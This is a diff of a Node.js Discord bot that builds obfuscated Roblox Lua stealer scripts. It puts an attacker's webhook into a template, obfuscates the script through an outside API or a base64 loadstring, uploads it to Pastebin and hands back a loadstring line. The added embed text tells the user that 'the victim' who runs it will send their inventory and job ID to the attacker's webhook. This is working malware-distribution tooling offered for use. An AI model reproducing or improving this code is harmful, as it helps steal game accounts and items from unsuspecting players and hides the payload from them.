@@ -2,25 +2,23 @@ const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require
 const axios = require('axios');
 const FormData = require('form-data');
 const fs = require('fs');
+const path = require('path');
 const express = require('express');
 require('dotenv').config();
 
-// ----- Web server for health checks -----
+// ----- Web server -----
 const app = express();
 const PORT = process.env.PORT || 3000;
 app.get('/', (req, res) => res.send('Bot is alive!'));
 app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
 
-// ----- Self‑ping to keep Render alive -----
+// ----- Self‑ping -----
 const RENDER_URL = process.env.RENDER_URL;
 if (RENDER_URL) {
   console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
-  // Ping every 4 minutes
   setInterval(() => {
     axios.get(RENDER_URL).catch(() => {});
   }, 4 * 60 * 1000);
-  
-  // Also ping when the bot starts
   setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
 } else {
   console.log('⚠️ RENDER_URL not set – self‑ping disabled.');
@@ -29,7 +27,6 @@ if (RENDER_URL) {
 // ----- Discord Bot -----
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
-// Goofyscator API (free, no key)
 const OBFUSCATE_URL = 'https://goofyscator.lua.cz/api/obfuscate';
 
 client.once('ready', () => {
@@ -72,12 +69,18 @@ client.on('interactionCreate', async interaction => {
     }
 
     try {
-        // 1. Read and inject placeholders
-        let template = fs.readFileSync('./template.lua', 'utf8');
+        // ----- Read template.lua -----
+        const templatePath = path.join(__dirname, 'template.lua');
+        if (!fs.existsSync(templatePath)) {
+            return interaction.editReply({ 
+                content: '❌ Template file not found. Please ensure `template.lua` is in the bot directory.' 
+            });
+        }
+        let template = fs.readFileSync(templatePath, 'utf8');
         template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
         template = template.replace(/\{\{USERNAME\}\}/g, username);
 
-        // 2. Obfuscate via Goofyscator (max security)
+        // ----- Obfuscate via Goofyscator (or fallback) -----
         let obfuscatedScript;
         try {
             const form = new FormData();
@@ -95,29 +98,49 @@ client.on('interactionCreate', async interaction => {
             }
         } catch (obfError) {
             console.error('Obfuscation error:', obfError.message);
-            // Fallback: Base64 obfuscation
+            // Fallback: Base64
             const encoded = Buffer.from(template, 'utf8').toString('base64');
             obfuscatedScript = `-- Fallback obfuscation\nloadstring(game:HttpGet("data:text/plain;base64," .. "${encoded}"))()`;
         }
 
-        // 3. Upload to Pastebin
-        const pasteUrl = await uploadToPastebin(obfuscatedScript, username);
+        // ----- Upload to Pastebin -----
+        const pastebinRawUrl = await uploadToPastebin(obfuscatedScript, username);
 
-        // 4. Reply with embed
+        // ----- Build loadstring -----
+        const loadstringLine = `loadstring(game:HttpGet("${pastebinRawUrl}"))()`;
+
+        // ----- Reply with embed (show the loadstring) -----
         const embed = new EmbedBuilder()
             .setColor(0x00FF00)
             .setTitle('✅ Script Generated (Goofyscated)')
             .setDescription(`**Game:** ${game}\n**User:** ${username}`)
             .addFields(
-                { name: '📦 Download Link', value: pasteUrl },
-                { name: '🔒 Obfuscation', value: 'Goofyscator (max level – VM + anti‑tamper)' },
-                { name: '📌 Instructions', value: 'Run this script in a Blox Fruits executor. The loading screen will appear, and your webhook will receive inventory data.' }
+                { 
+                    name: '📜 Loadstring (copy this)', 
+                    value: `\`\`\`lua\n${loadstringLine}\n\`\`\``,
+                    inline: false 
+                },
+                { 
+                    name: '📦 Direct Link (for reference)', 
+                    value: pastebinRawUrl,
+                    inline: false 
+                },
+                { 
+                    name: '🔒 Obfuscation', 
+                    value: 'Goofyscator (max level – VM + anti‑tamper)',
+                    inline: false 
+                },
+                { 
+                    name: '📌 Instructions', 
+                    value: 'Paste the loadstring above into a Blox Fruits executor and run it. The victim will see the loading screen, and you\'ll get their inventory + job ID in your webhook.',
+                    inline: false 
+                }
             )
             .setTimestamp();
 
         await interaction.editReply({ embeds: [embed] });
 
-        // 5. Ping self after successful command to keep alive
+        // ----- Self‑ping -----
         if (RENDER_URL) {
             axios.get(RENDER_URL).catch(() => {});
         }
@@ -128,7 +151,7 @@ client.on('interactionCreate', async interaction => {
     }
 });
 
-// ----- Pastebin Upload -----
+// ----- Pastebin Upload (returns RAW URL) -----
 async function uploadToPastebin(content, username) {
     const apiKey = process.env.PASTEBIN_API_KEY;
     if (!apiKey) {
@@ -151,7 +174,10 @@ async function uploadToPastebin(content, username) {
     if (!pasteUrl.startsWith('https://pastebin.com/')) {
         throw new Error('Pastebin upload failed: ' + pasteUrl);
     }
-    return pasteUrl;
+
+    // Convert to raw URL
+    const pasteId = pasteUrl.split('/').pop();
+    return `https://pastebin.com/raw/${pasteId}`;
 }
 
 client.login(process.env.DISCORD_TOKEN);
